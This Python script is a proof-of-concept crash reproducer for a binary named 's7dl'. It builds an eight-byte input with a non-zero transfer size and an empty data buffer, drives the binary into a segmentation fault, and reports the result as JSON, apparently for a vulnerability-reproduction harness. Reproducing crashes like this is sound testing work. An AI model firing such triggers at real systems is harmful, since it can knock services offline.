#!/usr/bin/env python3
"""Reproduce the strongest observable outcome of the `s7dl` target binary.

The target accepts an input whose layout is:

    bytes 0..3   signed 32-bit LE "block number"
    bytes 4..7   signed 32-bit LE "transfer size"
    bytes 8..    arbitrary data buffer

It prints a status line ``block_num=<n> size=<n> buff_len=<n>`` and then a
result line; a result line containing ``error:`` means the request was
rejected, anything else means it completed normally.

This script builds a trigger input at runtime that makes the binary process
an empty data buffer (``buff_len=0``) while a non-zero transfer size is in
play.  That combination deterministically drives the binary into a memory
fault during processing (observed: SIGSEGV / exit -11), which is the
strongest outcome the interface can produce.  If the binary under test does
not fault, the observed outcome is still reported faithfully.

Contract: run the binary exactly once, capture stdout/stderr/exit status and
emit a single JSON object on stdout.
"""

import argparse
import json
import os
import signal
import struct
import subprocess
import sys
import tempfile
import time


def build_trigger():
    """Construct the trigger input bytes at runtime.

    block number 1 and transfer size 16 pass the CLI parameter checks, and an
    empty data buffer (no bytes after the 8-byte header) leaves the download
    path with nothing to copy into -- the processing step then dereferences
    an invalid address and the process dies from SIGSEGV.
    """
    block_num = 1
    transfer_size = 16
    return struct.pack("<ii", block_num, transfer_size) + b""


def signal_name(signum):
    """Best-effort SIG* name for a positive signal number."""
    try:
        return signal.Signals(signum).name
    except ValueError:
        return "SIG%d" % signum


def main():
    parser = argparse.ArgumentParser(
        description="Run the s7dl binary once with a runtime-constructed "
        "trigger input and report the observed outcome."
    )
    parser.add_argument("--binary", required=True,
                        help="path to the target s7dl binary")
    parser.add_argument("--json-out", default=None,
                        help="optional path to also write the JSON result to")
    parser.add_argument("--timeout", type=float, default=10.0,
                        help="per-run timeout in seconds (default 10)")
    args = parser.parse_args()

    binary = args.binary
    if not binary or not os.path.isfile(binary):
        json.dump(
            {
                "binary": binary,
                "command": [binary] if binary else [],
                "returncode": None,
                "signal": None,
                "timed_out": False,
                "runtime_ms": 0,
                "stdout": "",
                "stderr": "",
                "observable": {"kind": "custom", "value": None, "path": None},
                "error": "binary not found: %r" % (binary,),
            },
            sys.stdout,
        )
        sys.stdout.write("\n")
        return 0

    payload = build_trigger()

    # The trigger is built in memory and materialized into a fresh temporary
    # file each run; nothing is read from a fixed payload path.
    tmp_dir = tempfile.mkdtemp(prefix="s7dl_poc_")
    input_path = os.path.join(tmp_dir, "trigger.bin")
    with open(input_path, "wb") as fh:
        fh.write(payload)

    command = [binary, input_path]

    timed_out = False
    stdout_text = ""
    stderr_text = ""
    returncode = None
    sig_name = None

    start = time.monotonic()
    try:
        proc = subprocess.run(
            command,
            capture_output=True,
            timeout=max(args.timeout, 0.1),
        )
        returncode = proc.returncode
        stdout_text = proc.stdout.decode("utf-8", errors="replace")
        stderr_text = proc.stderr.decode("utf-8", errors="replace")
    except subprocess.TimeoutExpired as exc:
        timed_out = True
        if exc.stdout is not None:
            stdout_text = exc.stdout.decode("utf-8", errors="replace")
        if exc.stderr is not None:
            stderr_text = exc.stderr.decode("utf-8", errors="replace")
        returncode = None
    except OSError as exc:
        result = {
            "binary": binary,
            "command": command,
            "returncode": None,
            "signal": None,
            "timed_out": False,
            "runtime_ms": 0,
            "stdout": "",
            "stderr": "",
            "observable": {"kind": "custom", "value": None, "path": None},
            "error": "failed to execute binary: %s" % (exc,),
        }
        _emit(result, args.json_out)
        return 0
    finally:
        runtime_ms = int(round((time.monotonic() - start) * 1000.0))

    if returncode is not None and returncode < 0 and not timed_out:
        # Killed by a signal: returncode is the negated signal number.
        sig = -returncode
        sig_name = signal_name(sig)
        outcome = "crash:%s" % sig_name
    elif timed_out:
        sig_name = None
        outcome = "timeout"
    else:
        sig_name = None
        outcome = "exit:%s" % returncode

    result = {
        "binary": binary,
        "command": command,
        "returncode": returncode,
        "signal": sig_name,
        "timed_out": timed_out,
        "runtime_ms": runtime_ms,
        "stdout": stdout_text,
        "stderr": stderr_text,
        "observable": {"kind": "custom", "value": outcome, "path": None},
        "error": None,
    }

    _emit(result, args.json_out)
    return 0


def _emit(result, json_out_path):
    """Print the JSON object to stdout and optionally mirror it to a file."""
    text = json.dumps(result, indent=2)
    sys.stdout.write(text)
    sys.stdout.write("\n")
    if json_out_path:
        try:
            with open(json_out_path, "w", encoding="utf-8") as fh:
                fh.write(text + "\n")
        except OSError:
            pass


if __name__ == "__main__":
    sys.exit(main())
